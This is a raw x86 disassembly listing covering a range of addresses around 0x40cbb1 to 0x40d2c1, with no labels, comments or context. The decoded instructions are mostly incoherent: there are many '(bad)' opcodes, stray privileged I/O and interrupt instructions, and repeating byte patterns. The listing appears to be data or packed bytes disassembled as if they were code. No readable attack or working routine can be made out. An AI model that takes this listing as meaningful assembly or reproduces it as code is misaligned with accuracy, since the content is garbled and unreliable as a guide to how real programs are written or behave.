  40cbb1:	(bad)  
  40cbb2:	inc    ebx
  40cbb3:	add    BYTE PTR [eax],al
  40cbb5:	add    BYTE PTR [ecx+0x40],al
  40cbb8:	bound  esp,QWORD PTR [esi+0x0]
  40cbbb:	inc    eax
  40cbbc:	add    eax,0x5400000
  40cbc1:	inc    ecx
  40cbc2:	inc    eax
  40cbc3:	inc    eax
  40cbc4:	bound  esp,QWORD PTR ds:0x25050043
  40cbca:	inc    ecx
  40cbcb:	inc    ebx
  40cbcc:	inc    eax
  40cbcd:	test   BYTE PTR [eax+0x0],al
  40cbd0:	bound  ebx,QWORD PTR [eax+0x62]
  40cbd3:	inc    ecx
  40cbd4:	inc    eax
  40cbd5:	lahf   
  40cbd6:	inc    eax
  40cbd7:	popa   
  40cbd8:	adc    al,0x41
  40cbda:	sub    BYTE PTR [ebx],dh
  40cbdc:	adc    DWORD PTR [eax+0x50],esp
  40cbdf:	push   esp
  40cbe0:	inc    eax
  40cbe1:	adc    DWORD PTR [edx+0x50],eax
  40cbe4:	out    0x33,al
  40cbe6:	jns    0x40cc4c
  40cbe8:	ins    BYTE PTR es:[edi],dx
  40cbe9:	shr    BYTE PTR [edx],1
  40cbeb:	inc    esp
  40cbec:	bound  ecx,QWORD PTR [edi]
  40cbee:	mov    esi,0x4622ac7
  40cbf3:	push   ecx
  40cbf4:	push   ebx
  40cbf5:	xor    DWORD PTR [eax-0x2c],ebx
  40cbf8:	mov    BYTE PTR [ebx],al
  40cbfa:	arpl   WORD PTR [ebx-0x36],bp
  40cbfd:	ds jno 0x40cbad
  40cc00:	arpl   WORD PTR [ecx+eiz*2+0x5874f9ad],si
  40cc07:	test   al,0x54
  40cc09:	push   edx
  40cc0a:	clc    
  40cc0b:	mov    eax,0x42fb685a
  40cc10:	or     eax,0x62106356
  40cc15:	inc    eax
  40cc16:	inc    ecx
  40cc17:	and    eax,0x40000500
  40cc1c:	inc    ebx
  40cc1d:	add    eax,0x40624041
  40cc22:	inc    ebx
  40cc23:	add    eax,0x43402541
  40cc28:	bound  eax,QWORD PTR [eax+0x43]
  40cc2b:	int3   
  40cc2c:	inc    eax
  40cc2d:	bound  eax,QWORD PTR [eax]
  40cc2f:	inc    ecx
  40cc30:	inc    eax
  40cc31:	inc    eax
  40cc32:	add    eax,0x461f4305
  40cc37:	sub    ch,BYTE PTR [edx]
  40cc39:	retf   
  40cc3a:	and    al,0x71
  40cc3c:	sar    BYTE PTR [eax],cl
  40cc3e:	popf   
  40cc3f:	rol    DWORD PTR [ecx+0x4f],1
  40cc42:	xor    eax,0xc05d84a9
  40cc47:	pop    esp
  40cc48:	jbe    0x40cc8b
  40cc4a:	in     al,0xa8
  40cc4c:	xor    DWORD PTR [eax-0x29dbcfcd],0xffffffa8
  40cc53:	add    ebp,esp
  40cc55:	popa   
  40cc56:	push   edi
  40cc57:	sub    al,0x5d
  40cc59:	lods   al,BYTE PTR ds:[esi]
  40cc5a:	jge    0x40cc9b
  40cc5c:	xlat   BYTE PTR ds:[ebx]
  40cc5d:	div    ecx
  40cc5f:	sub    DWORD PTR [ebx-0x70],esp
  40cc62:	and    esp,DWORD PTR [edx+0x40]
  40cc65:	and    eax,0x5406600
  40cc6a:	inc    ebx
  40cc6b:	inc    ecx
  40cc6c:	inc    eax
  40cc6d:	inc    eax
  40cc6e:	inc    ebx
  40cc6f:	add    BYTE PTR [eax],al
  40cc71:	add    BYTE PTR [edx-0x34],ah
  40cc74:	inc    eax
  40cc75:	add    eax,0x40004041
  40cc7a:	inc    ecx
  40cc7b:	int3   
  40cc7c:	add    BYTE PTR [ebx-0x7c],al
  40cc7f:	add    eax,0x5406240
  40cc84:	bound  edi,QWORD PTR [ecx+0x41]
  40cc87:	cwde   
  40cc88:	dec    ebp
  40cc89:	xchg   edx,eax
  40cc8a:	cmp    eax,0x43346224
  40cc8f:	and    BYTE PTR [eax+0x7a],dl
  40cc92:	dec    ecx
  40cc93:	xor    eax,0x56306b1d
  40cc98:	scas   eax,DWORD PTR es:[edi]
  40cc99:	add    esi,DWORD PTR [esp+ebx*1]
  40cc9c:	pushf  
  40cc9d:	std    
  40cc9e:	dec    esp
  40cc9f:	dec    ecx
  40cca0:	and    edx,DWORD PTR [edx+0x6984cdb6]
  40cca6:	inc    eax
  40cca7:	mov    ch,0x46
  40cca9:	mov    ch,0xdf
  40ccab:	cmp    ebx,eax
  40ccad:	pop    eax
  40ccae:	xor    ebx,eax
  40ccb0:	xchg   ebx,eax
  40ccb1:	daa    
  40ccb2:	arpl   WORD PTR [edx+0x4],si
  40ccb5:	arpl   WORD PTR [eax+eax*2+0x62],bp
  40ccb9:	pop    eax
  40ccba:	inc    ecx
  40ccbb:	add    eax,0x40404340
  40ccc0:	inc    ebx
  40ccc1:	inc    eax
  40ccc2:	test   BYTE PTR [eax],al
  40ccc4:	add    eax,0x40624041
  40ccc9:	inc    eax
  40ccca:	add    BYTE PTR [edx+0x5],ah
  40cccd:	inc    ebx
  40ccce:	add    BYTE PTR [eax+0x78],al
  40ccd1:	inc    ecx
  40ccd2:	add    BYTE PTR [eax+0x41],bl
  40ccd5:	bound  ebp,QWORD PTR [esi+0x53]
  40ccd8:	imul   ebx,DWORD PTR [esi+0x55dd1e56],0xfffffff4
  40ccdf:	fidiv  WORD PTR [ebx]
  40cce1:	push   ecx
  40cce2:	test   al,0x5a
  40cce4:	inc    edx
  40cce5:	inc    edi
  40cce6:	add    DWORD PTR [esi+0x2a],eax
  40cce9:	xor    al,0x12
  40cceb:	dec    ebx
  40ccec:	add    al,0xc5
  40ccee:	pop    es
  40ccef:	mov    edi,0xfc50fd1d
  40ccf4:	ins    BYTE PTR es:[edi],dx
  40ccf5:	std    
  40ccf6:	sub    ebp,DWORD PTR [ecx+0x56]
  40ccf9:	lods   al,BYTE PTR ds:[esi]
  40ccfa:	adc    eax,0xa727ed6a
  40ccff:	push   ecx
  40cd00:	aas    
  40cd01:	arpl   bx,cx
  40cd03:	test   eax,0xf3d675ab
  40cd08:	dec    edi
  40cd09:	inc    esp
  40cd0a:	adc    DWORD PTR [eax+esi*4],ebp
  40cd0d:	or     DWORD PTR [eax+0x4d],0x40
  40cd11:	test   BYTE PTR [eax],al
  40cd13:	int3   
  40cd14:	bound  eax,QWORD PTR ds:0xcc840f41
  40cd1a:	inc    ebx
  40cd1b:	add    BYTE PTR [eax+0x0],al
  40cd1e:	inc    eax
  40cd1f:	inc    eax
  40cd20:	inc    eax
  40cd21:	int3   
  40cd22:	add    BYTE PTR ds:0x62404341,al
  40cd28:	pop    eax
  40cd29:	add    BYTE PTR [ebx+0x40],al
  40cd2c:	bound  ecx,QWORD PTR [edi]
  40cd2e:	inc    eax
  40cd2f:	adc    al,0x3c
  40cd31:	inc    ebp
  40cd32:	arpl   WORD PTR ds:0x69535641,dx
  40cd38:	sub    ah,BYTE PTR [bx+di-0x37]
  40cd3c:	inc    ebx
  40cd3d:	pop    esp
  40cd3e:	sbb    ch,BYTE PTR [ebp+ecx*1+0x10]
  40cd42:	fadd   QWORD PTR [edx+0x30]
  40cd45:	dec    esi
  40cd46:	xchg   ebp,eax
  40cd47:	xchg   ebx,eax
  40cd48:	bound  esp,QWORD PTR gs:[ebx+0x43]
  40cd4c:	dec    eax
  40cd4d:	add    BYTE PTR [eax],al
  40cd4f:	inc    eax
  40cd50:	inc    eax
  40cd51:	cmovno eax,DWORD PTR ds:0x40056243
  40cd58:	int3   
  40cd59:	add    ah,cl
  40cd5b:	inc    eax
  40cd5c:	inc    eax
  40cd5d:	bound  eax,QWORD PTR [ecx+0x0]
  40cd60:	add    BYTE PTR [edi],cl
  40cd62:	inc    ebx
  40cd63:	inc    eax
  40cd64:	inc    eax
  40cd65:	add    BYTE PTR [ecx+0x43],al
  40cd68:	add    eax,0x40256240
  40cd6d:	bound  eax,QWORD PTR [eax]
  40cd6f:	xchg   esp,eax
  40cd70:	aaa    
  40cd71:	sti    
  40cd72:	in     eax,dx
  40cd73:	dec    esp
  40cd74:	inc    esp
  40cd75:	inc    edx
  40cd76:	inc    eax
  40cd77:	mov    ds:0x562d657,al
  40cd7c:	outs   dx,DWORD PTR ds:[esi]
  40cd7d:	add    al,0x31
  40cd7f:	add    dh,BYTE PTR [ebx+0xcf7a03b]
  40cd85:	ja     0x40cdf3
  40cd87:	dec    ebx
  40cd88:	inc    edi
  40cd89:	push   0xf7e84fd8
  40cd8e:	jb     0x40cda3
  40cd90:	xchg   ebx,eax
  40cd91:	inc    eax
  40cd92:	xchg   ebx,eax
  40cd93:	inc    ecx
  40cd94:	test   BYTE PTR [edi+0x5],cl
  40cd97:	add    ah,cl
  40cd99:	inc    eax
  40cd9a:	inc    ecx
  40cd9b:	inc    eax
  40cd9c:	inc    ebx
  40cd9d:	bound  esp,QWORD PTR ds:0x41400043
  40cda3:	add    BYTE PTR [eax],al
  40cda5:	add    eax,0x43624062
  40cdaa:	inc    ecx
  40cdab:	inc    eax
  40cdac:	inc    eax
  40cdad:	inc    eax
  40cdae:	add    eax,0x40624340
  40cdb3:	add    eax,0x40664140
  40cdb8:	jns    0x40cd7f
  40cdba:	inc    edx
  40cdbb:	pusha  
  40cdbc:	dec    eax
  40cdbd:	inc    eax
  40cdbe:	sbb    al,0x44
  40cdc0:	std    
  40cdc1:	mov    dl,BYTE PTR [eax]
  40cdc3:	dec    esi
  40cdc4:	jge    0x40cdfa
  40cdc6:	leave  
  40cdc7:	sub    eax,0x5d68a349
  40cdcc:	outs   dx,BYTE PTR ds:[esi]
  40cdcd:	inc    ebx
  40cdce:	inc    esp
  40cdcf:	(bad)  
  40cdd0:	nop
  40cdd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdd2:	inc    eax
  40cdd3:	dec    esi
  40cdd4:	mov    ah,0x2a
  40cdd6:	inc    ebx
  40cdd7:	add    BYTE PTR ds:0x41107840,al
  40cddd:	bound  eax,QWORD PTR [eax+0x40]
  40cde0:	sldt   WORD PTR [eax-0x34]
  40cde4:	js     0x40ce48
  40cde6:	add    eax,0x40664143
  40cdeb:	inc    ebx
  40cdec:	add    BYTE PTR [ecx+0x5],al
  40cdef:	js     0x40ce31
  40cdf1:	bound  eax,QWORD PTR [eax+0x0]
  40cdf4:	inc    eax
  40cdf5:	push   eax
  40cdf6:	arpl   WORD PTR [edx+0x635f60c5],cx
  40cdfc:	inc    eax
  40cdfd:	xlat   BYTE PTR ds:[ebx]
  40cdfe:	add    BYTE PTR [ebx-0x25],0x44
  40ce02:	dec    esi
  40ce03:	mov    ebp,0x33a8c02a
  40ce08:	inc    eax
  40ce09:	aas    
  40ce0a:	pop    edi
  40ce0b:	add    eax,DWORD PTR [eax+0x62]
  40ce0e:	adc    BYTE PTR [eax+eax*2+0x44],al
  40ce12:	inc    eax
  40ce13:	enter  0x582a,0xbe
  40ce17:	inc    eax
  40ce18:	inc    eax
  40ce19:	aas    
  40ce1a:	push   ebx
  40ce1b:	inc    edx
  40ce1c:	jg     0x40ce2b
  40ce1e:	add    eax,0x57a34031
  40ce23:	xor    BYTE PTR [ebx+ecx*8-0x9],al
  40ce27:	ins    BYTE PTR es:[edi],dx
  40ce28:	cmp    eax,0x4043417b
  40ce2d:	inc    eax
  40ce2e:	add    eax,0x434162
  40ce33:	inc    eax
  40ce34:	add    BYTE PTR [edx+0x5],ah
  40ce37:	inc    eax
  40ce38:	adc    BYTE PTR [edx+0x40],ah
  40ce3b:	inc    ebx
  40ce3c:	inc    ecx
  40ce3d:	add    eax,0x4340
  40ce42:	add    eax,0x404162
  40ce47:	add    BYTE PTR [eax+0x43],al
  40ce4a:	inc    eax
  40ce4b:	add    eax,0x4f26e15f
  40ce50:	inc    ebx
  40ce51:	paddsb mm7,QWORD PTR [edi+0x5f]
  40ce55:	data16 jl 0x40ce8d
  40ce58:	push   edx
  40ce59:	inc    ebx
  40ce5a:	and    ecx,DWORD PTR [edx+ebp*8-0x33]
  40ce5e:	gs inc eax
  40ce60:	in     al,0xd1
  40ce62:	loope  0x40ce43
  40ce64:	pop    ebx
  40ce65:	add    DWORD PTR [ebx+eax*2-0x35],edx
  40ce69:	fxch   st(0)
  40ce6b:	add    esp,DWORD PTR [edi]
  40ce6d:	int    0x9
  40ce6f:	or     BYTE PTR [esi-0x4261f0f4],bh
  40ce75:	test   al,0xfd
  40ce77:	pushf  
  40ce78:	adc    eax,0x43037fc1
  40ce7d:	cmp    DWORD PTR [edx+0x62],esp
  40ce80:	leave  
  40ce81:	jmp    0x40ce95
  40ce83:	lahf   
  40ce84:	mov    edi,0x266d0f6b
  40ce89:	sub    BYTE PTR [eax+0x0],al
  40ce8c:	add    BYTE PTR [ecx+0x43],al
  40ce8f:	add    eax,0x41784062
  40ce94:	inc    eax
  40ce95:	inc    eax
  40ce96:	add    BYTE PTR [edi],cl
  40ce98:	bound  eax,QWORD PTR [ebx+0x0]
  40ce9b:	add    eax,0x25006240
  40cea0:	inc    eax
  40cea1:	add    eax,0x40254143
  40cea6:	add    eax,0xd5620000
  40ceab:	adc    ebp,DWORD PTR [eax]
  40cead:	bound  esi,QWORD PTR [eax]
  40ceaf:	inc    eax
  40ceb0:	push   ecx
  40ceb1:	inc    eax
  40ceb2:	lods   eax,DWORD PTR ds:[esi]
  40ceb3:	fs pop ds
  40ceb5:	mov    eax,0x40cb6233
  40ceba:	cmp    DWORD PTR [esp+edi*2+0x26c28024],esi
  40cec1:	inc    ecx
  40cec2:	or     ch,BYTE PTR [edi+edi*4]
  40cec5:	inc    ebx
  40cec6:	add    BYTE PTR [eax],al
  40cec8:	add    BYTE PTR [ecx+0x40],al
  40cecb:	bound  esp,QWORD PTR [esi+0x0]
  40cece:	inc    eax
  40cecf:	add    eax,0x5400000
  40ced4:	inc    ecx
  40ced5:	inc    eax
  40ced6:	inc    eax
  40ced7:	bound  esp,QWORD PTR ds:0x25050043
  40cedd:	inc    ecx
  40cede:	inc    ebx
  40cedf:	inc    eax
  40cee0:	test   BYTE PTR [eax+0x0],al
  40cee3:	bound  ebx,QWORD PTR [eax+0x62]
  40cee6:	inc    ecx
  40cee7:	inc    eax
  40cee8:	popa   
  40cee9:	dec    eax
  40ceea:	sbb    al,0xb0
  40ceec:	inc    eax
  40ceed:	or     BYTE PTR [ebx+0x3f],al
  40cef0:	xor    al,0x25
  40cef2:	bound  ecx,QWORD PTR ds:0x3f12b446
  40cef8:	inc    ebp
  40cef9:	std    
  40cefa:	ror    bl,0x40
  40cefd:	jo     0x40ceb4
  40ceff:	cmp    eax,DWORD PTR [edi+0x307e490d]
  40cf05:	push   ebx
  40cf06:	mov    edx,0x21f8503f
  40cf0b:	dec    ecx
  40cf0c:	ins    BYTE PTR es:[edi],dx
  40cf0d:	cmp    edx,DWORD PTR [ebp+0x28]
  40cf10:	(bad)  
  40cf11:	gs dec ebp
  40cf13:	inc    edx
  40cf14:	sub    al,0x94
  40cf16:	idiv   edi
  40cf18:	push   ebx
  40cf19:	push   gs
  40cf1b:	adc    BYTE PTR [edx+0x40],ah
  40cf1e:	inc    ecx
  40cf1f:	and    eax,0x40000500
  40cf24:	inc    ebx
  40cf25:	add    eax,0x40624041
  40cf2a:	inc    ebx
  40cf2b:	add    eax,0x43402541
  40cf30:	bound  eax,QWORD PTR [eax+0x43]
  40cf33:	int3   
  40cf34:	inc    eax
  40cf35:	bound  eax,QWORD PTR [eax]
  40cf37:	inc    ecx
  40cf38:	inc    eax
  40cf39:	inc    eax
  40cf3a:	add    eax,0x46437c05
  40cf3f:	push   ds
  40cf40:	mov    edi,0x78c690a8
  40cf45:	sar    DWORD PTR [ecx],1
  40cf47:	ror    DWORD PTR [esi+0x10],1
  40cf4a:	aas    
  40cf4b:	jb     0x40cf66
  40cf4d:	cmp    eax,0xb8135220
  40cf52:	jge    0x40cfa7
  40cf54:	inc    edx
  40cf55:	iret   
  40cf56:	pop    es
  40cf57:	jb     0x40cf5a
  40cf59:	inc    ecx
  40cf5a:	es push esp
  40cf5c:	jge    0x40cfa0
  40cf5e:	aad    0x26
  40cf60:	xor    edx,DWORD PTR ds:0x676b300a
  40cf66:	cmp    BYTE PTR [esi+edx*2+0x4c],cl
  40cf6a:	arpl   cx,bp
  40cf6c:	or     ebp,DWORD PTR [eax]
  40cf6e:	aaa    
  40cf6f:	bound  eax,QWORD PTR [eax+0x25]
  40cf72:	add    BYTE PTR [esi+0x40],ah
  40cf75:	add    eax,0x40404143
  40cf7a:	inc    ebx
  40cf7b:	add    BYTE PTR [eax],al
  40cf7d:	add    BYTE PTR [edx-0x34],ah
  40cf80:	inc    eax
  40cf81:	add    eax,0x40004041
  40cf86:	inc    ecx
  40cf87:	int3   
  40cf88:	add    BYTE PTR [ebx-0x7c],al
  40cf8b:	add    eax,0x5406240
  40cf90:	(bad)  
  40cf92:	jae    0x40cfe6
  40cf94:	sub    DWORD PTR [ebx+eiz*4+0x42],eax
  40cf98:	sbb    eax,0xd09dc909
  40cf9d:	cld    
  40cf9e:	push   ecx
  40cf9f:	add    al,0xfe
  40cfa1:	sbb    ebx,edi
  40cfa3:	mov    WORD PTR [edx],es
  40cfa5:	pop    ecx
  40cfa6:	fidiv  WORD PTR [eax-0x6c]
  40cfa9:	gs leave 
  40cfab:	test   al,0x84
  40cfad:	pusha  
  40cfae:	cs (bad) 
  40cfb0:	enter  0xdfb2,0x45
  40cfb4:	bound  esi,QWORD PTR [esi]
  40cfb6:	inc    edx
  40cfb7:	inc    eax
  40cfb8:	inc    esi
  40cfb9:	aaa    
  40cfba:	jmp    0x40cffd
  40cfbc:	mov    ah,0x16
  40cfbe:	jge    0x40cff0
  40cfc0:	iret   
  40cfc1:	aaa    
  40cfc2:	mov    bh,0x46
  40cfc4:	adc    ah,BYTE PTR [ebp+0x6c]
  40cfc7:	ins    BYTE PTR es:[edi],dx
  40cfc8:	rol    esp,cl
  40cfca:	adc    ah,ah
  40cfcc:	add    esi,ebx
  40cfce:	inc    eax
  40cfcf:	bound  ebx,QWORD PTR [eax+0x41]
  40cfd2:	add    eax,0x40404340
  40cfd7:	inc    ebx
  40cfd8:	inc    eax
  40cfd9:	test   BYTE PTR [eax],al
  40cfdb:	add    eax,0x40624041
  40cfe0:	inc    eax
  40cfe1:	add    BYTE PTR [edx+0x5],ah
  40cfe4:	inc    ebx
  40cfe5:	add    BYTE PTR [eax+0x78],al
  40cfe8:	inc    ecx
  40cfe9:	add    BYTE PTR [eax+0x41],bl
  40cfec:	bound  eax,QWORD PTR [ecx+ecx*8+0x40]
  40cff0:	repz mov ebx,0x7c126356
  40cff6:	inc    edi
  40cff7:	pusha  
  40cff8:	add    BYTE PTR [eax-0x58],al
  40cffb:	dec    edi
  40cffc:	mov    esp,0x5340c56d
  40d001:	push   eax
  40d002:	push   edx
  40d003:	xor    al,0x15
  40d005:	mov    edi,0xbf504059
  40d00a:	test   al,0xf
  40d00c:	cld    
  40d00d:	mov    al,0xb
  40d00f:	inc    eax
  40d010:	test   BYTE PTR [eax],al
  40d012:	int3   
  40d013:	bound  eax,QWORD PTR ds:0xcc840f41
  40d019:	inc    ebx
  40d01a:	add    BYTE PTR [eax+0x0],al
  40d01d:	inc    eax
  40d01e:	inc    eax
  40d01f:	inc    eax
  40d020:	int3   
  40d021:	add    BYTE PTR ds:0x62404341,al
  40d027:	pop    eax
  40d028:	add    BYTE PTR [ebx+0x40],al
  40d02b:	bound  ecx,QWORD PTR [edi]
  40d02d:	inc    eax
  40d02e:	inc    eax
  40d02f:	repz ja 0x40d079
  40d032:	cmp    cl,bh
  40d034:	ret    
  40d035:	inc    esi
  40d036:	push   eax
  40d037:	dec    eax
  40d038:	adc    BYTE PTR [edx],ch
  40d03a:	mov    ah,0x62
  40d03c:	mov    ah,0x13
  40d03e:	inc    eax
  40d03f:	xor    eax,0xc20569b9
  40d044:	add    BYTE PTR [eax],al
  40d046:	inc    eax
  40d047:	inc    eax
  40d048:	cmovno eax,DWORD PTR ds:0x40056243
  40d04f:	int3   
  40d050:	add    ah,cl
  40d052:	inc    eax
  40d053:	inc    eax
  40d054:	bound  eax,QWORD PTR [ecx+0x0]
  40d057:	add    BYTE PTR [edi],cl
  40d059:	inc    ebx
  40d05a:	inc    eax
  40d05b:	inc    eax
  40d05c:	add    BYTE PTR [ecx+0x43],al
  40d05f:	add    eax,0x40256240
  40d064:	bound  eax,QWORD PTR [eax]
  40d066:	add    eax,0xd6014041
  40d06b:	inc    ecx
  40d06c:	leave  
  40d06d:	gs retf 
  40d06f:	inc    edi
  40d070:	inc    eax
  40d071:	pop    ds
  40d072:	pop    edi
  40d073:	inc    ecx
  40d074:	nop
  40d075:	fucomp st(7)
  40d077:	and    al,0x50
  40d079:	add    DWORD PTR [edx],edx
  40d07b:	lods   al,BYTE PTR ds:[esi]
  40d07c:	mov    edi,0x40b8ab7e
  40d081:	pop    ds
  40d082:	adc    eax,0x5bc4067
  40d087:	add    ah,cl
  40d089:	inc    eax
  40d08a:	inc    ecx
  40d08b:	inc    eax
  40d08c:	inc    ebx
  40d08d:	bound  esp,QWORD PTR ds:0x41400043
  40d093:	add    BYTE PTR [eax],al
  40d095:	add    eax,0x43624062
  40d09a:	inc    ecx
  40d09b:	inc    eax
  40d09c:	inc    eax
  40d09d:	inc    eax
  40d09e:	add    eax,0x40624340
  40d0a3:	add    eax,0x40664140
  40d0a8:	mov    al,0x40
  40d0aa:	inc    eax
  40d0ab:	dec    esp
  40d0ac:	inc    ebp
  40d0ad:	inc    esi
  40d0ae:	inc    eax
  40d0af:	arpl   WORD PTR [esi+0x31],ax
  40d0b2:	inc    eax
  40d0b3:	xchg   ecx,eax
  40d0b4:	xlat   BYTE PTR ds:[ebx]
  40d0b5:	test   al,0x42
  40d0b7:	sahf   
  40d0b8:	aaa    
  40d0b9:	ins    BYTE PTR es:[edi],dx
  40d0ba:	adc    BYTE PTR [edi],bh
  40d0bc:	int    0x42
  40d0be:	adc    al,0x65
  40d0c0:	cmp    dh,ah
  40d0c2:	inc    eax
  40d0c3:	imul   edi,DWORD PTR [edi-0x6d],0x2963ddc0
  40d0ca:	inc    eax
  40d0cb:	jno    0x40d0d9
  40d0cd:	cmp    ecx,ebx
  40d0cf:	in     eax,0xb0
  40d0d1:	loope  0x40d113
  40d0d3:	inc    esi
  40d0d4:	push   eax
  40d0d5:	inc    ebx
  40d0d6:	add    BYTE PTR ds:0x41107840,al
  40d0dc:	bound  eax,QWORD PTR [eax+0x40]
  40d0df:	sldt   WORD PTR [eax-0x34]
  40d0e3:	js     0x40d147
  40d0e5:	add    eax,0x40664143
  40d0ea:	inc    ebx
  40d0eb:	add    BYTE PTR [ecx+0x5],al
  40d0ee:	js     0x40d130
  40d0f0:	bound  eax,QWORD PTR [eax+0x0]
  40d0f3:	inc    eax
  40d0f4:	bound  edi,QWORD PTR [edi+0x10e01508]
  40d0fa:	mov    al,0x79
  40d0fc:	dec    edi
  40d0fd:	mov    edi,0x4069cb63
  40d102:	je     0x40d142
  40d104:	in     al,dx
  40d105:	jb     0x40d157
  40d107:	mov    ah,0x52
  40d109:	inc    eax
  40d10a:	imul   eax,DWORD PTR [eax+0x11],0x283507c6
  40d111:	inc    ecx
  40d112:	jae    0x40d18b
  40d114:	mov    eax,0x4142d9a8
  40d119:	shr    BYTE PTR [esp+ecx*8+0x52],1
  40d11d:	adc    ah,BYTE PTR [edx+0x2]
  40d120:	lahf   
  40d121:	inc    eax
  40d122:	adc    al,0x41
  40d124:	inc    ebx
  40d125:	inc    eax
  40d126:	inc    eax
  40d127:	add    eax,0x434162
  40d12c:	inc    eax
  40d12d:	add    BYTE PTR [edx+0x5],ah
  40d130:	inc    eax
  40d131:	adc    BYTE PTR [edx+0x40],ah
  40d134:	inc    ebx
  40d135:	inc    ecx
  40d136:	add    eax,0x4340
  40d13b:	add    eax,0x404162
  40d140:	add    BYTE PTR [eax+0x43],al
  40d143:	inc    eax
  40d144:	add    eax,0xd9bc26b9
  40d149:	int3   
  40d14a:	cmp    al,0x40
  40d14c:	imul   ecx,DWORD PTR [edi],0xcde41573
  40d152:	inc    eax
  40d153:	inc    eax
  40d154:	(bad)  
  40d155:	cmp    DWORD PTR [ebx+ecx*8+0x40307462],ebx
  40d15c:	pusha  
  40d15d:	nop    DWORD PTR [ecx+0x65]
  40d161:	jae    0x40d1cf
  40d163:	inc    eax
  40d164:	pop    edx
  40d165:	aas    
  40d166:	(bad)  
  40d167:	sub    bl,ah
  40d169:	inc    eax
  40d16a:	adc    ecx,0xffffffb1
  40d16d:	(bad)  
  40d16f:	inc    eax
  40d170:	jmp    0x9d8114b6
  40d175:	inc    eax
  40d176:	add    BYTE PTR [eax],al
  40d178:	inc    ecx
  40d179:	inc    ebx
  40d17a:	add    eax,0x41784062
  40d17f:	inc    eax
  40d180:	inc    eax
  40d181:	add    BYTE PTR [edi],cl
  40d183:	bound  eax,QWORD PTR [ebx+0x0]
  40d186:	add    eax,0x25006240
  40d18b:	inc    eax
  40d18c:	add    eax,0x40254143
  40d191:	add    eax,0x3f620000
  40d196:	sub    al,BYTE PTR fs:[ebx+eax*1-0x2f]
  40d19b:	inc    eax
  40d19c:	popa   
  40d19d:	inc    esp
  40d19e:	jo     0x40d1e0
  40d1a0:	std    
  40d1a1:	lock out 0x40,al
  40d1a4:	lahf   
  40d1a5:	lahf   
  40d1a6:	lock sub ch,BYTE PTR [edi+0x63]
  40d1aa:	push   es
  40d1ab:	aas    
  40d1ac:	cmp    BYTE PTR [ecx],dl
  40d1ae:	push   edx
  40d1af:	inc    eax
  40d1b0:	test   al,0x43
  40d1b2:	add    BYTE PTR [eax],al
  40d1b4:	add    BYTE PTR [ecx+0x40],al
  40d1b7:	bound  esp,QWORD PTR [esi+0x0]
  40d1ba:	inc    eax
  40d1bb:	add    eax,0x5400000
  40d1c0:	inc    ecx
  40d1c1:	inc    eax
  40d1c2:	inc    eax
  40d1c3:	bound  esp,QWORD PTR ds:0x25050043
  40d1c9:	inc    ecx
  40d1ca:	inc    ebx
  40d1cb:	inc    eax
  40d1cc:	test   BYTE PTR [eax+0x0],al
  40d1cf:	bound  ebx,QWORD PTR [eax+0x62]
  40d1d2:	inc    ecx
  40d1d3:	inc    eax
  40d1d4:	mov    ah,0xf7
  40d1d6:	inc    eax
  40d1d7:	xchg   ebp,eax
  40d1d8:	imul   BYTE PTR [eax-0x3df227d6]
  40d1de:	inc    eax
  40d1df:	jge    0x40d260
  40d1e1:	add    al,0x4c
  40d1e3:	inc    esp
  40d1e4:	jae    0x40d227
  40d1e6:	inc    eax
  40d1e7:	aam    0x7a
  40d1e9:	in     eax,0x84
  40d1eb:	cld    
  40d1ec:	mov    BYTE PTR [edi+0x3c],al
  40d1ef:	xor    cl,BYTE PTR [edx]
  40d1f1:	(bad)
  40d1f6:	inc    eax
  40d1f7:	je     0x40d20b
  40d1f9:	mov    dl,0xbf
  40d1fb:	add    al,BYTE PTR [edx-0x50]
  40d1fe:	inc    eax
  40d1ff:	adc    DWORD PTR [ecx],ebp
  40d201:	mov    esp,0x4051dcbf
  40d206:	inc    eax
  40d207:	inc    esp
  40d208:	loop   0x40d270
  40d20a:	xchg   DWORD PTR [ebp+0x332e3190],ecx
  40d210:	adc    BYTE PTR [edx+0x40],ah
  40d213:	inc    ecx
  40d214:	and    eax,0x40000500
  40d219:	inc    ebx
  40d21a:	add    eax,0x40624041
  40d21f:	inc    ebx
  40d220:	add    eax,0x43402541
  40d225:	bound  eax,QWORD PTR [eax+0x43]
  40d228:	int3   
  40d229:	inc    eax
  40d22a:	bound  eax,QWORD PTR [eax]
  40d22c:	inc    ecx
  40d22d:	inc    eax
  40d22e:	inc    eax
  40d22f:	add    eax,0x8a4c7105
  40d234:	push   0x6d406c64
  40d239:	bound  edi,QWORD PTR [eax+ebp*4+0x40a0a868]
  40d240:	xor    edx,DWORD PTR [eax+0x72]
  40d243:	adc    DWORD PTR [eax+0x10],ebx
  40d246:	inc    edi
  40d247:	inc    eax
  40d248:	leave  
  40d249:	xor    al,BYTE PTR [ecx-0x80]
  40d24c:	mov    bh,0xbf
  40d24e:	lds    eax,FWORD PTR [eax+0x74]
  40d251:	push   ebx
  40d252:	mov    WORD PTR ds:0xd7a705c5,cs
  40d258:	scas   eax,DWORD PTR es:[edi]
  40d259:	mov    cl,0x53
  40d25b:	int    0xa2
  40d25d:	inc    edx
  40d25e:	test   DWORD PTR [edx+0x10a8583a],esp
  40d264:	test   al,0x61
  40d266:	out    dx,eax
  40d267:	out    0x1d,eax
  40d269:	icebp  
  40d26a:	adc    DWORD PTR [ecx+edx*1+0x254062d8],edi
  40d271:	add    BYTE PTR [esi+0x40],ah
  40d274:	add    eax,0x40404143
  40d279:	inc    ebx
  40d27a:	add    BYTE PTR [eax],al
  40d27c:	add    BYTE PTR [edx-0x34],ah
  40d27f:	inc    eax
  40d280:	add    eax,0x40004041
  40d285:	inc    ecx
  40d286:	int3   
  40d287:	add    BYTE PTR [ebx-0x7c],al
  40d28a:	add    eax,0x5406240
  40d28f:	bound  esp,QWORD PTR [ebx-0x4be4aecb]
  40d295:	add    eax,0x2d28b448
  40d29a:	dec    ebp
  40d29b:	cmp    cl,BYTE PTR ds:0x423541cd
  40d2a1:	mov    ss,WORD PTR [ecx-0x47]
  40d2a4:	inc    edx
  40d2a5:	inc    eax
  40d2a6:	or     BYTE PTR [edi],al
  40d2a8:	add    al,0x81
  40d2aa:	cmp    BYTE PTR [edi],al
  40d2ac:	push   esp
  40d2ad:	sub    bh,ah
  40d2af:	inc    eax
  40d2b0:	bound  ebx,QWORD PTR [eax+0x41]
  40d2b3:	add    eax,0x40404340
  40d2b8:	inc    ebx
  40d2b9:	inc    eax
  40d2ba:	test   BYTE PTR [eax],al
  40d2bc:	add    eax,0x40624041
  40d2c1:	inc    eax
